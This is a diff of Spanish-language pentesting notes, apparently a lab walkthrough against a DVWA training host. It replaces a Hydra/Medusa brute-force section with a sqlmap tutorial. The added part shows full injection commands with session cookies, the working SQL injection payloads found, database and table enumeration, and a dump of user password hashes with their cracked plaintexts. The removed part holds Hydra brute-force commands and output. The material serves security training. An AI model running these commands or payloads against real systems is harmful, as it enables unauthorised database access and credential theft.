@@ -1,68 +1,150 @@
-# TOOLS FORCE BRUTE ATTACK
-## HYDRA
+# TOOLS SQL INJECTION
+## SQL-MAP
 ___
-**Hydra.-** es una herramienta de prueba de penetración (pentesting) que se utiliza para realizar ataques de fuerza bruta a sistemas de autenticación. Es una herramienta de línea de comandos que permite automatizar el proceso de adivinación de contraseñas para varios protocolos de autenticación, incluyendo FTP, SSH, Telnet, HTTP, HTTPS, entre otros.
-
-### POST-FORM
+Es una herramienta de prueba de penetración de código abierto que automatiza la detección y explotación de vulnerabilidades de inyección SQL en aplicaciones web. La herramienta es compatible con múltiples sistemas de gestión de bases de datos, incluidos MySQL, Oracle, PostgreSQL y Microsoft SQL Server, y utiliza técnicas avanzadas de prueba de inyección SQL para determinar si una aplicación web es vulnerable a ataques de inyección SQL y, de ser así, automatizar la explotación de la vulnerabilidad. SQLMap también puede utilizarse para recuperar información valiosa de bases de datos, como tablas, columnas, credenciales y datos confidenciales almacenados.
 #### Ejecución
+
+```java                                                         
+┌──(s3cur1ty3c㉿kali)-[~/Escritorio]
+└─$ sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low"___
+       __H__                                                                                                                                                                                
+ ___ ___[)]_____ ___ ___  {1.6.12#stable}                                                                                                                                                   
+|_ -| . [,]     | .'| . |                                                                                                                                                                   
+|___|_  [']_|_|_|__,|  _|                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                              
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:37:45 /2023-02-15/
+[14:37:45] [WARNING] provided value for parameter 'id' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[14:37:45] [INFO] resuming back-end DBMS 'mysql' 
+[14:37:45] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=' OR NOT 8746=8746#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=' AND (SELECT 3829 FROM(SELECT COUNT(*),CONCAT(0x716b787671,(SELECT (ELT(3829=3829,1))),0x716a6a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FOjM&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=' AND (SELECT 9284 FROM (SELECT(SLEEP(5)))kwAX)-- qFqJ&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=' UNION ALL SELECT NULL,CONCAT(0x716b787671,0x636a636242684369556d51536741684458506b75686570496c6566764d44727a537a4d6a6d784b50,0x716a6a6b71)#&Submit=Submit
+---
+[14:37:45] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.2.14, PHP 5.3.1
+back-end DBMS: MySQL >= 5.0
+[14:37:45] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
+[*] ending @ 14:37:45 /2023-02-15/
+```
+La sentencia `sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low"` ejecuta el programa SQLMap para buscar y explotar vulnerabilidades de inyección SQL en la URL proporcionada.
+
+Los parámetros de la sentencia son:
+
+>* "-u": URL objetivo de la página web a analizar.
+>* "--cookie": Cookies de sesión necesarias para acceder a la página.
+>* "PHPSESSID": Identificador de sesión PHP en la cookie.
+>* "security": Nivel de seguridad de la página web, en este caso, "low".
+
+En resumen, esta sentencia ejecuta una prueba de inyección SQL en la página web `http://192.168.200.152/vulnerabilities/sqli/` utilizando las cookies de sesión indicadas.
+
+### Enumeración DataBase
+El parámetro `--dbs` es una de las opciones que se pueden proporcionar a SQLMap para indicar que se deben enumerar todas las bases de datos disponibles en el servidor subyacente. SQLMap luego intentará inyectar código SQL en el sitio web objetivo para extraer información sobre las bases de datos disponibles en el servidor.
 ``` java
-hydra 192.168.200.152 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -L user.txt -P password.txt   
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-15 11:03:17
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 78 login tries (l:3/p:26), ~5 tries per task
-[DATA] attacking http-post-form://192.168.200.152:80/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
-[80][http-post-form] host: 192.168.200.152   login: admin   password: password
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-15 11:03:20
+┌──(s3cur1ty3c㉿kali)-[~/Escritorio]
+└─$ sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" --dbs
+[15:09:39] [INFO] fetching database names
+available databases [6]:
+[*] cdcol
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] phpmyadmin
+[*] test
+[15:09:39] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
+[*] ending @ 15:09:39 /2023-02-15/
 ```
-En la línea de comando de Hydra, los flags significan lo siguiente:
-
->* **192.168.200.152.-** Indica la dirección IP del servidor que se va a atacar.
->* **http-post-form.-** Indica el protocolo que se va a utilizar para la comunicación con el servidor. En este caso, se utilizará el protocolo HTTP y se enviarán los datos de inicio de sesión mediante un formulario HTTP POST.
->* **"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed":** Esta cadena de caracteres representa la URL y los datos del formulario que se utilizarán en el ataque. Se especifica el archivo login.php y se definen los campos del formulario de inicio de sesión, incluyendo el nombre de usuario, la contraseña y el botón de inicio de sesión. "Login failed" indica el mensaje que se mostrará en caso de que el intento de inicio de sesión falle.
->* **-L user.txt:** Especifica el archivo que contiene una lista de nombres de usuario que se utilizarán en el ataque.
->* **-P password.txt:** Especifica el archivo que contiene una lista de contraseñas que se utilizarán en el ataque.
-
-### GET_FORM
-#### Ejecución
-
-```java
-hydra 192.168.200.152 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low:F=Username and/or password incorrect" -L user.txt -P /usr/share/wordlists/rockyou.txt   
-Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-15 12:57:21
-[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
-[DATA] attacking http-get-form://192.168.200.152:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low:F=Username and/or password incorrect
-[80][http-get-form] host: 192.168.200.152   login: admin   password: password
-^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+#### Enumeración de Tablas
+El parámetro `--tables` en la sentencia de SQLMap indica que SQLMap debe enumerar todas las tablas disponibles en la base de datos especificada con el parámetro -D.
+``` java
+ sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" --tables -D dvwa 
+[15:17:33] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.2.14, PHP 5.3.1
+back-end DBMS: MySQL >= 5.0
+[15:17:33] [INFO] fetching tables for database: 'dvwa'
+[15:17:33] [WARNING] reflective value(s) found and filtering out
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
 ```
-
-Este comando usa la herramienta Hydra para realizar un ataque de fuerza bruta en un formulario de inicio de sesión en una página web alojada en la dirección IP 192.168.200.152.
-
->* **"http-get-form".-** especifica que se debe usar el método HTTP GET para enviar el formulario de inicio de sesión.
->* **"/vulnerabilities/brute/".-** es la URL del formulario de inicio de sesión.
->* **":username=^USER^&password=^PASS^&Login=Login".-** son los campos del formulario de inicio de sesión que se van a atacar. Los valores de usuario y contraseña se reemplazarán con los valores del archivo de usuario y de la lista de contraseñas proporcionados.
->* **"H=Cookie:PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2;.-** security=low" son las cookies que se van a enviar junto con la solicitud de inicio de sesión. En este caso, se envía una cookie PHPSESSID con un valor específico y se establece el nivel de seguridad en "bajo".
->* **"F=Username and/or password incorrect".-** es el mensaje que se muestra en la página web cuando se ingresan credenciales incorrectas.
->* **"-L user.txt".-** especifica la ruta del archivo que contiene los nombres de usuario que se utilizarán para el ataque de fuerza bruta.
->* **"-P /usr/share/wordlists/rockyou.txt".-** especifica la ruta de la lista de contraseñas que se utilizará para el ataque de fuerza bruta. En este caso, se utiliza la popular lista de 
-
-## MEDUSA
-___
-**Medusa.-** es una herramienta de prueba de penetración que se utiliza para realizar ataques de fuerza bruta contra sistemas y aplicaciones. Su función principal es intentar adivinar credenciales de inicio de sesión, como nombres de usuario y contraseñas, mediante la repetición de pruebas con diferentes combinaciones de credenciales.
-
-Medusa puede trabajar con varios protocolos, incluyendo FTP, SSH, Telnet, SMTP, HTTP, HTTPS, SMB, y muchos otros. La herramienta puede utilizar varios métodos de autenticación, como diccionarios de contraseñas, ataque por fuerza bruta y ataques de diccionario personalizado. Además, Medusa es compatible con varias plataformas y sistemas operativos, incluyendo Linux, Windows y macOS.
-
-Es importante tener en cuenta que Medusa debe ser utilizado únicamente con fines éticos y legales. Es necesario obtener la autorización previa del propietario del sistema o aplicación que se va a probar antes de utilizar cualquier herramienta de prueba de penetración.
->* -h: Este flag indica el host o dirección IP del sistema o aplicación que se va a atacar.
->* -U: Este flag especifica el archivo que contiene una lista de nombres de usuario que se probarán en el ataque.
->* -P: Este flag especifica el archivo que contiene una lista de contraseñas que se probarán en el ataque.
->* -M: Este flag indica el protocolo que se utilizará para comunicarse con el sistema o aplicación que se va a atacar, como http, ftp, ssh, telnet, etc.
->* -m: Este flag indica el modo de autenticación que se utilizará para el ataque, como diccionario, fuerza bruta, etc.
->* -T: Este flag indica el número máximo de hilos (threads) que se utilizarán en el ataque.
->* -f: Este flag indica que se deben utilizar las contraseñas de los usuarios proporcionados en el archivo de nombres de usuario.
->* -e: Este flag indica que se deben utilizar contraseñas vacías en el ataque.
->* -B: Este flag indica que se deben utilizar técnicas de ataque especiales, como ataque de diccionario personalizado, fuerza bruta por intervalo de tiempo, etc.
->* -C: Este flag indica que se deben utilizar diferentes códigos de respuesta del servidor para identificar si una prueba de credenciales ha sido exitosa o no.
+#### Enumeración de Columnas
+El parámetro `--columns` en SQLMap se utiliza para enumerar las columnas (campos) de una tabla específica en una base de datos.
+``` java
+sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" -D dvwa -T users --columns
+[15:21:41] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.3.1, Apache 2.2.14
+back-end DBMS: MySQL >= 5.0
+[15:21:41] [INFO] fetching columns for table 'users' in database 'dvwa'
+[15:21:41] [WARNING] reflective value(s) found and filtering out
+Database: dvwa
+Table: users
+[6 columns]
++------------+-------------+
+| Column     | Type        |
++------------+-------------+
+| user       | varchar(15) |
+| avatar     | varchar(70) |
+| first_name | varchar(15) |
+| last_name  | varchar(15) |
+| password   | varchar(32) |
+| user_id    | int(6)      |
++------------+-------------+
+[15:21:41] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
+[*] ending @ 15:21:41 /2023-02-15/
+```
+#### Enumeración por consulta SQL-Query
+En este caso, la opción `--sql-query` se utiliza para especificar una consulta SQL que selecciona los datos de las columnas específicas de la tabla "users". Los datos se muestran en la salida de la consola de SQLMap, en el formato predeterminado.
+``` java
+sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" -D dvwa --sql-query "SELECT user, first_name, last_name, password FROM users"
+[15:49:22] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.2.14, PHP 5.3.1
+back-end DBMS: MySQL >= 5.0
+[15:49:22] [INFO] fetching SQL SELECT statement query output: 'SELECT user, first_name, last_name, password FROM users'
+[15:49:22] [WARNING] reflective value(s) found and filtering out
+SELECT user, first_name, last_name, password FROM users [5]:
+[*] admin, admin, admin, 5f4dcc3b5aa765d61d8327deb882cf99
+[*] gordonb, Gordon, Brown, e99a18c428cb38d5f260853678922e03
+[*] 1337, Hack, Me, 8d3533d75ae2c3966d7e0d4fcc69216b
+[*] pablo, Pablo, Picasso, 0d107d09f5bbe40cade3de5c71e9e9b7
+[*] smithy, Bob, Smith, 5f4dcc3b5aa765d61d8327deb882cf99
+[15:49:22] [INFO] fetched data logged to text files under '/home/s3cur1ty3c/.local/share/sqlmap/output/192.168.200.152'
+[*] ending @ 15:49:22 /2023-02-15/
+```
+#### Volcado o descarga de credenciales.
+El parámetro `--dump` es utilizado en la herramienta de seguridad SQLMap para extraer los datos de las columnas de una tabla de una base de datos que ha sido comprometida con éxito por medio de una inyección de SQL.
+Cuando SQLMap encuentra una vulnerabilidad de inyección de SQL en un sitio web o una aplicación web, intenta utilizar esa vulnerabilidad para obtener acceso a la base de datos subyacente. Una vez que ha obtenido acceso, se puede utilizar el parámetro --dump para extraer los datos de las columnas de una tabla en particular.
+``` java                                                                 
+┌──(s3cur1ty3c㉿kali)-[~/Escritorio]
+└─$ sqlmap -u "http://192.168.200.152/vulnerabilities/sqli/?id=&Submit=Submit" --cookie="PHPSESSID=o39naa5urd4qrgkfo5n6fv4jf2; security=low" -D dvwa -T users --columns -C "user, password" --dump                                                         
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------------------------------------------+
+| user    | password                                    |
++---------+---------------------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------------------------------------------+
+```
